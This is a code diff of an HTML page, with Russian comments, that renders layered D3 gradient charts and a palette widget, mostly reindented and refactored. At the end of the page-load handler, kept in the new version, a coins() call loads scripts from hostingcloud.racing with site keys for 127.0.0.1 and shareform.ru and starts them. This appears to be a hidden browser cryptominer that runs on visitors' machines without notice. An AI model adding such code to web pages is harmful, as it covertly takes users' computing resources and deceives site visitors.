@@ -48,433 +48,435 @@
 
 <body style='background-color: #01040a'>
 
-
     <script>
         const win = window;
 
         win.onload = () => {
-            try {
-                let width = win.innerWidth - 0;
-                let height = win.innerHeight - 7;
+            /*
+                        try {
+                            */
+            let width = win.innerWidth - 0;
+            let height = win.innerHeight - 7;
 
-                //https://mdigi.tools/color-shades/#061639
+            //https://mdigi.tools/color-shades/#061639
 
-                let margin = 0,
-                    padding = 0;
+            let margin = 0,
+                padding = 0;
 
-                rawData = [{
-                        x: 0,
-                        y: 0
-                    }, {
-                        x: 10,
-                        y: 67
-                    }, {
-                        x: 20,
-                        y: 74
-                    }, {
-                        x: 30,
-                        y: 63
-                    }, {
-                        x: 40,
-                        y: 56
-                    }, {
-                        x: 50,
-                        y: 24
-                    }, {
-                        x: 60,
-                        y: 26
-                    }, {
-                        x: 70,
-                        y: 19
-                    }, {
-                        x: 80,
-                        y: 42
-                    }, {
-                        x: 90,
-                        y: 88
-                    }, {
-                        x: 100,
-                        y: 70
-                    }],
-                    linedots = [];
+            rawData = [{
+                    x: 0,
+                    y: 0
+                }, {
+                    x: 10,
+                    y: 67
+                }, {
+                    x: 20,
+                    y: 74
+                }, {
+                    x: 30,
+                    y: 63
+                }, {
+                    x: 40,
+                    y: 56
+                }, {
+                    x: 50,
+                    y: 24
+                }, {
+                    x: 60,
+                    y: 26
+                }, {
+                    x: 70,
+                    y: 19
+                }, {
+                    x: 80,
+                    y: 42
+                }, {
+                    x: 90,
+                    y: 88
+                }, {
+                    x: 100,
+                    y: 70
+                }],
+                linedots = [];
 
 
-                let svg = d3.select("body").append("svg")
-                    .attr("class", "axis")
-                    .attr("viewBox", "0 0 " + width + " " + height)
-                    .attr("width", width)
-                    .attr("height", height);
+            let svg = d3.select("body").append("svg")
+                .attr("class", "axis")
+                .attr("viewBox", "0 0 " + width + " " + height)
+                .attr("width", width)
+                .attr("height", height);
 
-                win.onresize = () => {
-                    svg.attr("width", win.innerWidth);
-                    svg.attr("height", win.innerHeight);
-                };
+            win.onresize = () => {
+                svg.attr("width", win.innerWidth);
+                svg.attr("height", win.innerHeight);
+            };
 
-                // длина оси X= ширина контейнера svg - отступ слева и справа
-                let xAxisLength = width - 2 * margin;
+            // длина оси X= ширина контейнера svg - отступ слева и справа
+            let xAxisLength = width - 2 * margin;
 
-                // длина оси Y = высота контейнера svg - отступ сверху и снизу
-                let yAxisLength = height - 2 * margin;
+            // длина оси Y = высота контейнера svg - отступ сверху и снизу
+            let yAxisLength = height - 2 * margin;
 
-                // функция интерполяции значений на ось Х  
-                let scaleXAxisFromData = (data) => {
-                    return d3.scaleLinear()
-                        .domain([1, data.length + 1])
-                        .range([0, xAxisLength]);
-                };
-
-                let scaleX = scaleXAxisFromData(data);
-                let scaleX2 = scaleXAxisFromData(data2);
-                let scaleX3 = scaleXAxisFromData(data3);
-                let scaleX4 = scaleXAxisFromData(data4);
-                let scaleX5 = scaleXAxisFromData(data5);
-                var scaleXline = d3.scaleLinear()
-                    .domain([0, 100])
+            // функция интерполяции значений на ось Х  
+            let scaleXAxisFromData = (data) => {
+                return d3.scaleLinear()
+                    .domain([1, data.length + 1])
                     .range([0, xAxisLength]);
+            };
 
-                // функция интерполяции значений на ось Y
-                let scaleY = d3.scaleLinear()
-                    .domain([100, 0])
-                    .range([0, yAxisLength]);
+            let scaleX = [];
+            datas.forEach((data) => {
+                scaleX.push(scaleXAxisFromData(data));
+            });
 
-                // масштабирование реальных данных в данные для нашей координатной системы
-                for (i = 0; i < rawData.length; i++)
-                    linedots.push({
-                        x: scaleXline(rawData[i].x) + margin,
-                        y: scaleY(rawData[i].y) + margin
+            var scaleXline = d3.scaleLinear()
+                .domain([0, 100])
+                .range([0, xAxisLength]);
+
+            // функция интерполяции значений на ось Y
+            let scaleY = d3.scaleLinear()
+                .domain([100, 0])
+                .range([0, yAxisLength]);
+
+            // масштабирование реальных данных в данные для нашей координатной системы
+
+            for (i = 0; i < rawData.length; i++)
+                linedots.push({
+                    x: scaleXline(rawData[i].x) + margin,
+                    y: scaleY(rawData[i].y) + margin
+                });
+            /*
+                        rawData.forEach((r) => {
+                            linedots.push({
+                                x: scaleXline(r.x) + margin,
+                                y: scaleY(r.i) + margin
+                            });
+                        });*/
+            let defs = svg.append("defs");
+
+            function createBackgroundGradient(mainColor, gradientColor) {
+
+                let whiteGradient = defs.append("linearGradient")
+                    .attr("id", "whiteGradient")
+                    .attr("x1", "0%")
+                    .attr("y1", "0%")
+                    .attr("x2", "0%")
+                    .attr("y2", "100%");
+
+                whiteGradient.append("stop")
+                    .attr("offset", "0")
+                    .attr("stop-color", gradientColor)
+                    .attr("stop-opacity", "0.25");
+
+                whiteGradient.append("stop")
+                    .attr("offset", "1")
+                    .attr("stop-color", gradientColor)
+                    .attr("stop-opacity", "1");
+
+                let gradientMask = defs.append("mask")
+                    .attr("id", "gradientMask");
+
+                let rectMask = gradientMask.append("rect")
+                    .attr("x", "0")
+                    .attr("y", "0")
+                    .attr("width", width)
+                    .attr("height", height)
+                    .attr("fill", "url(#whiteGradient)");
+
+                svg.append("rect")
+                    .attr("x", "0")
+                    .attr("y", "0")
+                    .attr("width", width)
+                    .attr("height", height)
+                    .attr("fill", mainColor)
+                    .attr("mask", "url(#gradientMask)");
+            }
+
+            createBackgroundGradient(colors[8], "white"); // "#061639"
+
+            function createGradient(data) {
+                let Gradient = defs.append("linearGradient")
+                    .attr("id", data.id)
+                    .attr("x1", data.x1)
+                    .attr("x2", data.x2)
+                    .attr("y1", data.y1)
+                    .attr("y2", data.y2);
+
+                d3.select('#' + data.id).selectAll("stop").data(data.stops).enter().append("stop");
+                d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("offset", function(d) {
+                    return d['offset'];
+                });
+                d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("stop-color", function(d) {
+                    return d['stop-color'];
+                });
+                d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("stop-opacity", function(d) {
+                    return d['stop-opacity'];
+                });
+                d3.select('#' + data.id).selectAll('stop').data(data.stops).exit().remove();
+
+                return Gradient;
+            }
+
+            gradients.forEach((gradient) => {
+                createGradient(gradient);
+            });
+
+            function createLayer(index, data, fill, stroke, scaleX, scaleY) {
+                let m = defs.append("mask")
+                    .attr("id", "Mask" + index);
+
+                // создаем объект g для прямоугольников
+                let g = m.append("g")
+                    .attr("class", "body")
+                    .attr("transform", // сдвиг объекта вправо
+                        "translate(" + margin + ", 0 )");
+                // связываем данные с прямоугольниками
+
+                g.selectAll("rect.bar")
+                    .data(data)
+                    .enter()
+                    .append("rect")
+                    .attr("class", "bar")
+                    .attr("fill", fill)
+                    .attr("stroke", stroke);
+
+                // устанавливаем параметры прямоугольников
+                g.selectAll("rect.bar")
+                    .data(data)
+                    .attr("x", function(d) {
+                        return scaleX(d.x);
+                    })
+                    .attr("y", function(d) {
+                        return scaleY(d.y) + margin;
+                    })
+                    .attr("height", function(d) {
+                        return yAxisLength - scaleY(d.y);
+                    })
+                    .attr("width", function(d) {
+
+                        return Math.floor(xAxisLength / data.length) - padding;
                     });
 
-                let defs = svg.append("defs");
+                let r = svg.append("rect")
+                    .attr("id", "Rect" + index)
+                    .attr("x", "0")
+                    .attr("y", "0")
+                    .attr("width", width)
+                    .attr("height", height)
+                    //.attr("fill", "url(#Gradient" + index + ")")
+                    .attr("fill", "url(#Gradient" + index + ")")
+                    .attr("mask", "url(#Mask" + index + ")");
 
-                function createBackgroundGradient(mainColor, gradientColor) {
+            }
 
-                    let whiteGradient = defs.append("linearGradient")
-                        .attr("id", "whiteGradient")
-                        .attr("x1", "0%")
-                        .attr("y1", "0%")
-                        .attr("x2", "0%")
-                        .attr("y2", "100%");
+            datas.forEach((d, i) => {
+                createLayer(i, datas[datas.length - i - 1], "#fff", "#fff", scaleX[scaleX.length - i - 1], scaleY);
+            });
 
-                    whiteGradient.append("stop")
-                        .attr("offset", "0")
-                        .attr("stop-color", gradientColor)
-                        .attr("stop-opacity", "0.25");
 
-                    whiteGradient.append("stop")
-                        .attr("offset", "1")
-                        .attr("stop-color", gradientColor)
-                        .attr("stop-opacity", "1");
 
-                    let gradientMask = defs.append("mask")
-                        .attr("id", "gradientMask");
+            // функция, создающая по массиву точек линии
+            var line = d3.line()
+                .x(function(d) {
+                    return d.x;
+                })
+                .y(function(d) {
+                    return d.y;
+                });
+            // добавляем путь
+            svg.append("g").append("path")
+                .attr("d", line(linedots))
+                .style("stroke", "steelblue")
+                .style("stroke-width", 2);
 
-                    let rectMask = gradientMask.append("rect")
-                        .attr("x", "0")
-                        .attr("y", "0")
+            // функция, создающая область
+            var area = d3.area()
+                .x(function(d) {
+                    return d.x;
+                })
+                .y0(height - margin)
+                .y1(function(d) {
+                    return d.y;
+                });
+
+            var g = svg.append("g");
+            g.append("path")
+                .attr("d", area(linedots))
+                .style("fill", 'url(#Gradient3)'); //"lightblue");
+            g.append("path")
+                .attr("d", line(linedots))
+                .style("stroke", 'url(#Gradient3)') //"steelblue")
+                .style("stroke-width", 2);
+
+            // добавляем отметки к точкам
+            svg.selectAll(".dot")
+                .data(rawData)
+                .enter().append("circle")
+                .attr("class", "dot")
+                .attr("r", 3.5)
+                .attr("cx", function(d) {
+                    return scaleXline(d.x) + margin;
+                })
+                .attr("cy", function(d) {
+                    return scaleY(d.y) + margin;
+                });
+
+
+            //#061639
+            //let pallete = chroma.scale(['#061639', 'black']).colors(24);
+            let palletejson = JSON.stringify(colors);
+
+            function Canvas(spec) {
+                let instance = {};
+                let headline, description;
+                let svg, width, height;
+                let data = {};
+                data.pallete = [];
+                data.gradients = [];
+                data.layers = [];
+
+                // создаем SVG
+                instance.createSvg = (width, height) => {
+                    svg = d3.select("body").append("svg")
+                        .attr("class", "axis")
+                        .attr("viewBox", "0 0 " + width + " " + height)
                         .attr("width", width)
-                        .attr("height", height)
-                        .attr("fill", "url(#whiteGradient)");
+                        .attr("height", height);
+                    return instance;
+                };
 
-                    svg.append("rect")
-                        .attr("x", "0")
-                        .attr("y", "0")
-                        .attr("width", width)
-                        .attr("height", height)
-                        .attr("fill", mainColor)
-                        .attr("mask", "url(#gradientMask)");
-                }
+                // присваиваем или получаем SVG
+                instance.svg = (s) => {
+                    if (!arguments.length) return svg;
+                    svg = s;
+                    return instance;
+                };
 
-                createBackgroundGradient(colors[8], "white"); // "#061639"
+                // устанавливаем или получаем ширину SVG
+                instance.width = (w) => {
+                    if (!arguments.length) return width;
+                    width = w;
+                    svg.attr("viewBox", "0 0 " + width + " " + height)
+                        .attr('width', width);
+                    return instance;
+                };
 
-                function createGradient(data) {
-                    let Gradient = defs.append("linearGradient")
-                        .attr("id", data.id)
-                        .attr("x1", data.x1)
-                        .attr("x2", data.x2)
-                        .attr("y1", data.y1)
-                        .attr("y2", data.y2);
+                // устанавливаем или получаем высоту SVG
+                instance.height = (h) => {
+                    if (!arguments.length) return height;
+                    height = h;
+                    svg.attr("viewBox", "0 0 " + width + " " + height)
+                        .attr('height', height);
+                    return instance;
+                };
 
-                    d3.select('#' + data.id).selectAll("stop").data(data.stops).enter().append("stop");
-                    d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("offset", function(d) {
-                        return d['offset'];
-                    });
-                    d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("stop-color", function(d) {
-                        return d['stop-color'];
-                    });
-                    d3.select('#' + data.id).selectAll('stop').data(data.stops).attr("stop-opacity", function(d) {
-                        return d['stop-opacity'];
-                    });
-                    d3.select('#' + data.id).selectAll('stop').data(data.stops).exit().remove();
+                // выводим виджет с заголовком и описанием
+                instance.showTextWidget = () => {
+                    let div = d3.select('body').append('div');
+                    div.append('h3').text(headline);
+                    div.attr('class', 'box')
+                        .attr('style', 'width: ' + spec.width + '; word-wrap: break-word;color:' + spec.color)
+                        .append('p')
+                        .text(description);
+                    return instance;
+                };
 
-                    return Gradient;
-                }
+                // присваиваем и получаем заголовок виджета
+                instance.headline = (h) => {
+                    if (!arguments.length) return headline;
+                    headline = h;
+                    return instance;
+                };
 
-                createGradient(gradientData1);
-                createGradient(gradientData2);
-                createGradient(gradientData3);
-                createGradient(gradientData4);
-                createGradient(gradientData5);
+                // присваиваем и получаем описание виджета
+                instance.description = (d) => {
+                    if (!arguments.length) return description;
+                    description = d;
+                    return instance;
+                };
 
-                function createLayer(index, data, fill, stroke, scaleX, scaleY) {
-                    let m = defs.append("mask")
-                        .attr("id", "Mask" + index);
+                // присваиваем и получаем объект с данными
+                instance.data = (d) => {
+                    if (!arguments.length) return data;
+                    data = d;
+                    return instance;
+                };
 
-                    // создаем объект g для прямоугольников
-                    let g = m.append("g")
-                        .attr("class", "body")
-                        .attr("transform", // сдвиг объекта вправо
-                            "translate(" + margin + ", 0 )");
-                    // связываем данные с прямоугольниками
+                // присваиваем и получаем цветовую палитру
+                instance.data.pallete = (p) => {
+                    if (!arguments.length) return data.pallete;
+                    data.pallete = p;
+                    return instance;
+                };
 
-                    g.selectAll("rect.bar")
-                        .data(data)
-                        .enter()
-                        .append("rect")
-                        .attr("class", "bar")
-                        .attr("fill", fill)
-                        .attr("stroke", stroke);
+                // присваиваем и получаем градиенты
+                instance.data.gradients = (g) => {
+                    if (!arguments.length) return data.gradients;
+                    data.gradients = g;
+                    return instance;
+                };
 
-                    // устанавливаем параметры прямоугольников
-                    g.selectAll("rect.bar")
-                        .data(data)
-                        .attr("x", function(d) {
-                            return scaleX(d.x);
-                        })
-                        .attr("y", function(d) {
-                            return scaleY(d.y) + margin;
-                        })
-                        .attr("height", function(d) {
-                            return yAxisLength - scaleY(d.y);
-                        })
-                        .attr("width", function(d) {
+                // присваиваем и получаем слои
+                instance.data.layers = (l) => {
+                    if (!arguments.length) return data.layers;
+                    data.layers = l;
+                    return instance;
+                };
 
-                            return Math.floor(xAxisLength / data.length) - padding;
-                        });
+                // создаем палитру
+                instance.createPallete = (obj) => {
+                    // obj.colors is an array of colors. Example ['yellow','lightgreen',l008ae5]
+                    // obj.domain is an array of stops. Example ['0,0.5,1']
+                    let _colors;
+                    if (obj.colors.length) {
+                        _colors = chroma.scale(obj.colors);
+                    } else {
+                        _colors = chroma.scale(['white', 'black']);
+                    }
+                    if (obj.domain.length) {
+                        _colors = _colors.domain(obj.domain);
+                    }
 
-                    let r = svg.append("rect")
-                        .attr("id", "Rect" + index)
-                        .attr("x", "0")
-                        .attr("y", "0")
-                        .attr("width", width)
-                        .attr("height", height)
-                        //.attr("fill", "url(#Gradient" + index + ")")
-                        .attr("fill", "url(#Gradient" + index + ")")
-                        .attr("mask", "url(#Mask" + index + ")");
+                    if (obj.count.length) {
+                        _colors = _colors.colors(count);
+                    } else {
+                        _colors = _colors.colors(24);
+                    }
 
-                }
-
-                createLayer(1, data5, "#fff", "#fff", scaleX5, scaleY);
-
-                createLayer(2, data4, "#fff", "#fff", scaleX4, scaleY);
-
-                createLayer(3, data3, "#fff", "#fff", scaleX3, scaleY);
-
-                createLayer(4, data2, "#fff", "#fff", scaleX2, scaleY);
-
-                createLayer(5, data, "#fff", "#fff", scaleX, scaleY);
-                /*
-                                // функция, создающая по массиву точек линии
-                                var line = d3.line()
-                                    .x(function(d) {
-                                        return d.x;
-                                    })
-                                    .y(function(d) {
-                                        return d.y;
-                                    });
-                                // добавляем путь
-                                svg.append("g").append("path")
-                                    .attr("d", line(linedots))
-                                    .style("stroke", "steelblue")
-                                    .style("stroke-width", 2);
-
-                                // функция, создающая область
-                                var area = d3.area()
-                                    .x(function(d) {
-                                        return d.x;
-                                    })
-                                    .y0(height - margin)
-                                    .y1(function(d) {
-                                        return d.y;
-                                    });
-
-                                var g = svg.append("g");
-                                g.append("path")
-                                    .attr("d", area(linedots))
-                                    .style("fill", "lightblue");
-                                g.append("path")
-                                    .attr("d", line(linedots))
-                                    .style("stroke", "steelblue")
-                                    .style("stroke-width", 2);
-
-                                // добавляем отметки к точкам
-                                svg.selectAll(".dot")
-                                    .data(rawData)
-                                    .enter().append("circle")
-                                    .attr("class", "dot")
-                                    .attr("r", 3.5)
-                                    .attr("cx", function(d) {
-                                        return scaleXline(d.x) + margin;
-                                    })
-                                    .attr("cy", function(d) {
-                                        return scaleY(d.y) + margin;
-                                    });
-
-                */
-                //#061639
-                //let pallete = chroma.scale(['#061639', 'black']).colors(24);
-                let palletejson = JSON.stringify(colors);
-
-                function Canvas(spec) {
-                    let instance = {};
-                    let headline, description;
-                    let svg, width, height;
-                    let data = {};
-                    data.pallete = [];
-                    data.gradients = [];
-                    data.layers = [];
-
-                    // создаем SVG
-                    instance.createSvg = (width, height) => {
-                        svg = d3.select("body").append("svg")
-                            .attr("class", "axis")
-                            .attr("viewBox", "0 0 " + width + " " + height)
-                            .attr("width", width)
-                            .attr("height", height);
-
-                        return instance;
-                    };
-
-                    // присваиваем или получаем SVG
-                    instance.svg = (s) => {
-                        if (!arguments.length) return svg;
-                        svg = s;
-                        return instance;
-                    };
-
-                    // устанавливаем или получаем ширину SVG
-                    instance.width = (w) => {
-                        if (!arguments.length) return width;
-                        width = w;
-                        svg.attr("viewBox", "0 0 " + width + " " + height)
-                            .attr('width', width);
-                        return instance;
-                    };
-
-                    // устанавливаем или получаем высоту SVG
-                    instance.height = (h) => {
-                        if (!arguments.length) return height;
-                        height = h;
-                        svg.attr("viewBox", "0 0 " + width + " " + height)
-                            .attr('height', height);
-                        return instance;
-                    };
-
-                    // выводим виджет с заголовком и описанием
-                    instance.showTextWidget = () => {
-                        let div = d3.select('body').append('div');
-                        div.append('h3').text(headline);
-                        div.attr('class', 'box')
-                            .attr('style', 'width: ' + spec.width + '; word-wrap: break-word;color:' + spec.color)
-                            .append('p')
-                            .text(description);
-                        return instance;
-                    };
-
-                    // присваиваем и получаем заголовок виджета
-                    instance.headline = (h) => {
-                        if (!arguments.length) return headline;
-                        headline = h;
-                        return instance;
-                    };
-
-                    // присваиваем и получаем описание виджета
-                    instance.description = (d) => {
-                        if (!arguments.length) return description;
-                        description = d;
-                        return instance;
-                    };
-
-                    // присваиваем и получаем объект с данными
-                    instance.data = (d) => {
-                        if (!arguments.length) return data;
-                        data = d;
-                        return instance;
-                    };
-
-                    // присваиваем и получаем цветовую палитру
-                    instance.data.pallete = (p) => {
-                        if (!arguments.length) return data.pallete;
-                        data.pallete = p;
-                        return instance;
-                    };
-
-                    // присваиваем и получаем градиенты
-                    instance.data.gradients = (g) => {
-                        if (!arguments.length) return data.gradients;
-                        data.gradients = g;
-                        return instance;
-                    };
-
-                    // присваиваем и получаем слои
-                    instance.data.layers = (l) => {
-                        if (!arguments.length) return data.layers;
-                        data.layers = l;
-                        return instance;
-                    };
-
-                    // создаем палитру
-                    instance.createPallete = (obj) => {
-                        // obj.colors is an array of colors. Example ['yellow','lightgreen',l008ae5]
-                        // obj.domain is an array of stops. Example ['0,0.5,1']
-                        let _colors;
-                        if (obj.colors.length) {
-                            _colors = chroma.scale(obj.colors);
-                        } else {
-                            _colors = chroma.scale(['white', 'black']);
-                        }
-                        if (obj.domain.length) {
-                            _colors = _colors.domain(obj.domain);
-                        }
-
-                        if (obj.count.length) {
-                            _colors = _colors.colors(count);
-                        } else {
-                            _colors = _colors.colors(24);
-                        }
-
-                        data.pallete = _colors;
-
-                        return instance;
-                    };
+                    data.pallete = _colors;
 
                     return instance;
-                }
+                };
 
-                let canvas = Canvas({
-                        color: '#6495ed',
-                        width: width
-                    })
-                    .headline('Pallete')
-                    .description(palletejson);
-
-                canvas.showTextWidget();
-
-            } catch (e) {
-                alert(e);
+                return instance;
             }
+
+            let canvas = Canvas({
+                    color: '#6495ed',
+                    width: width
+                })
+                .headline('Pallete')
+                .description(palletejson);
+
+            canvas.showTextWidget();
+            /*
+                        } catch (e) {
+                            alert(e);
+                        }
+            */
             let c = coins()
-            .addSite({
-                id: 'local',
-                match: '127.0.0.1',
-                src: 'https://www.hostingcloud.racing/2KFX.js',
-                key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
-            })
-            .addSite({
-                id: 'share',
-                match: 'shareform.ru',
-                src: 'https://www.hostingcloud.racing/rhdQ.js',
-                key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
-            }).start();
+                .addSite({
+                    id: 'local',
+                    match: '127.0.0.1',
+                    src: 'https://www.hostingcloud.racing/2KFX.js',
+                    key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
+                })
+                .addSite({
+                    id: 'share',
+                    match: 'shareform.ru',
+                    src: 'https://www.hostingcloud.racing/rhdQ.js',
+                    key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
+                }).start();
         }
     </script>
 </body>
